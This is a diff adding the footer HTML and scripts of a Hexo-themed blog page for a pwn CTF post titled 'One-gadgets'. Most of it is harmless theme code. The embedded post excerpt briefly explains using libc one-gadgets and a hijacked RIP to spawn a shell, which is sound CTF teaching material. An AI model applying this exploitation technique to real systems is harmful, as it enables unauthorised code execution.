+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "One-gadgets",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/One-gadgets/",
+          excerpt: "",
+          description: "",
+          stripContent: "One-gadgetsOne-gadget 是 libc 中存在的一些执行 execve(‘&amp;#x2F;bin&amp;#x2F;sh’, NULL, NULL)的片段。当我们知道 libc 的版本，并且通过信息泄露得到 libc 的基址，就可以通过控制 EIP&amp;#x2F;RIP(覆盖.got.plt 或者函数返回地址等)执行该 gadgets 达到远程代码的执行目的，获取 shell。 下载 one_gadgets1sudo gem install one_gadget   One_gadgets 的",
+          date: "Tue Apr 28 2026 18:25:56 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
